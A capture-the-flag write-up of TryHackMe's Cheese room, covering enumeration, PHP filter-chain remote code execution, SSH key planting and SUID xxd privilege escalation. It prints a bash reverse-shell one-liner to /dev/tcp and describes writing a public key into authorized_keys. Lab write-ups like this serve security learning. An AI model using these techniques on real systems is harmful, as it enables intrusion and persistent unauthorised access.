# Cheese_CTF
Here I am going to demonstrate how to complete tryhackme's Cheese CTF. I will enumerate, exploit, and gain access to root files.
YouTube Video I referenced for help: https://www.youtube.com/watch?v=V6tS5iPIX08

# Tools Used
- Nmap: Port Scanning
- Dirsearch: Directory Brute Forcing
- Caido: Proxy and HTTP Request Manipulation
- Kali Linux
  
# Skills Learned
- How to brute force directories by using a wordlist
- Detecting vulnerabilities by capturing, analyzing, and manipulation HTTP requests
- Creating a Reverse Shell
- Navigating Linux directories
  
# Enumeration
  ## Ping
  - First thing I did was edit /etc/hosts to hold the IP of the target machine as cheese.thm
    - The /etc/hosts entry is as follows: 10.10.63.230    cheese.thm
    - This allows me to ping the cheese.thm instead of having to remember the address.
    ![image](https://github.com/user-attachments/assets/80d2d092-1a00-4c2b-88d4-959c3d2fe553)

  ## nmap scan
  nmap -p- cheese.thm -T5 -v
    
  - First I scanned all hosts with the above nmap command. I found that every port is open which is strange.
    - The below image shows only some of the ports, since showing all of the ports would be too large of an image.   
    ![image](https://github.com/user-attachments/assets/e2b881f2-df5c-41dc-879a-fb6c3a9a4f1d)

  ## dirsearch
  - Among these open ports is port 80. So the first thing to find any directories associted with the web server I used dirsearch.
    
    ![image](https://github.com/user-attachments/assets/4a12f6e2-da96-4771-b3ce-a6f34279a133)
    - I found that the above directories through the dirsearch. After searching through some, I found the /messages.html to be especially interesting.
  ## web enumeration
  - I used Caido to view the webpage through it's built in proxy.
  - After visiting the http://cheese.thm/messages.html, I was greeted with the page below.
    ![image](https://github.com/user-attachments/assets/645ed499-eb08-43e5-9708-da5a842efabe)
    
  - After clicking the link I the below message was shown. However, the most interesting part is the php filter in the url which is our attack vector.
    
    ![image](https://github.com/user-attachments/assets/6837bcd1-cdb3-4ccd-97cf-0b195bf00069)
    
# Exploitation
  ## PHP filter
  - I discovered that it's possible to get remote code execution using a php filter chain.
  - I first turned Caido into queing mode to capture the HTTP GET request.
    ![image](https://github.com/user-attachments/assets/46c481b6-ffaa-42c8-877f-5f2b7f6e136a)
  - Gaining the actual remote code execution is done by using a PHP chain generator. The link to the generator is on github: https://github.com/synacktiv/php_filter_chain_generator
    
  ## Reverse Shell
  Link to Reverse Shell setup: https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/#reverse-shell
  - The first step is to create a revshell script on your local machine. The IP address is changed to your own IP address.
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  - Then in a new terminal uses the php filter generator to generate the chain for RCE.
    ![image](https://github.com/user-attachments/assets/0c1ab196-5f13-49f4-b482-ed30fdec1f37)
  - Then set up a netcat listener on the same port used in the revshell script, which is port 4444.
    ![image](https://github.com/user-attachments/assets/b7215df6-80e6-464d-bef0-34b1d8a9a6ee)
  - Next set up a simple web server on port 80 to curl the request back to your machine.
    ![image](https://github.com/user-attachments/assets/e4d87474-1716-4326-9dfd-f603f1359a43)
  - I pasted the php filter chain created earlier into the GET request we captured earlier to replay, and click send.
    ![image](https://github.com/user-attachments/assets/ee49df70-18de-47ac-b984-5dfabe23a1ef)
  - After sending we can see that a reverse shell has been created.
    ![image](https://github.com/user-attachments/assets/726092d2-fec7-4cf3-9b9b-91abda913ca9)
    ![image](https://github.com/user-attachments/assets/e9ac3a4c-c3a4-4dc0-ac05-59891b2e433b)
# User Flag
  - Now that we are in I can list files and directories. I can also move to the /home direcrory to find hosts (comte being imporant here).
    
    ![image](https://github.com/user-attachments/assets/02f2e66f-d81f-4099-8cd7-3f0cf38a58b3)
  - We can move into comte and view the files listed. The user.txt file is listed however we get permission denied when trying to read it.

    ![image](https://github.com/user-attachments/assets/df1079cf-e01f-4fc9-ab7d-471ffb625430)
    
  ### SSH Access
  - In order to get access, we need to be able to SSH. As seen before we have write access to the ~/.ssh directory, so we can move to this
    directory and see that there is an authorized_keys file we can write to. This means we can import our own local public key to the
    authorized_keys file to allow us to ssh as comte from our local machine.
    ![image](https://github.com/user-attachments/assets/c707c093-2846-472a-92c3-d99fa552e015)
  - To do this we find our own public key in our /.ssh directory and echo the public key into the authorized_keys file.
    ![image](https://github.com/user-attachments/assets/7e2108c5-3c3c-4a31-8ec3-101e6ccf5244)
    ![image](https://github.com/user-attachments/assets/063eed45-5f5c-42a7-842c-c8300f31b898)
  - Now we can ssh into our target machine as comte from our own machine and successfuly read the file as comte. However, I am not showing the flag here.
    
    ![image](https://github.com/user-attachments/assets/2b94a5b3-d4ac-4cb3-a556-42b132998e97)


# Privelage Escalation
- We can discover what services we can run as comte with the sudo -l command.
  ![image](https://github.com/user-attachments/assets/c053fa75-bb7f-4d56-a4ad-d577fb3041b8)
- Moving into the /etc/systemd directory allows us to view the details of the exploit.timer and exploit.service.
  ![image](https://github.com/user-attachments/assets/ad5e5f8d-bf04-4bc4-ace8-ec81c4602e64)
- As seen there isn't a time specified yet in the exploit timer, so I used nano to modify the exploit.timer file and specify 5 seconds.
  
  ![image](https://github.com/user-attachments/assets/4611fc23-472a-445c-928c-0d85fbd8d676)
- After setting this it's possible to run the sudo commands from earlier to run the exploit timer. Then you can move into the /opt directory to view
  the xxd service.
  - Link to view /xxd binary privelage escalation tactics: https://gtfobins.github.io/gtfobins/xxd/
  ![image](https://github.com/user-attachments/assets/a0dbe60e-932f-4289-bd60-bb4684ea7399)
- The above link says the -s bit of the /.xxd allows for any files to be read. So we can now read files only availabe to root such as /etc/shadow
  ![image](https://github.com/user-attachments/assets/107ae72f-9c1c-46e4-9872-b0be0b1ef7a4)


# Root Flag
- Using the above method the root.txt file can also be read to gain the root flag. Which I once again will not show.
  ![image](https://github.com/user-attachments/assets/50a91a3a-7ab7-4cbf-8b86-11cd77213557)













